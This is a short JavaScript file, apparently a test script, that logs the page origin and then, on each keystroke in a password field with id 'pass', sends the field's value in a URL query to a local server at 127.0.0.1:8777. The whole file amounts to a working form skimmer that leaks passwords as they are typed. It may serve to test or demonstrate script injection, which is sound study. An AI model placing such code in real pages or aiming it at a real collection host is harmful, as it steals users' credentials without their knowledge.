console.log('test.js loaded, the origin is: '+ window.origin )

document.querySelector('#pass').addEventListener('keyup', () => {
    fetch('http://127.0.0.1:8777/rest/test?pwd=' + document.querySelector('#pass').value)
})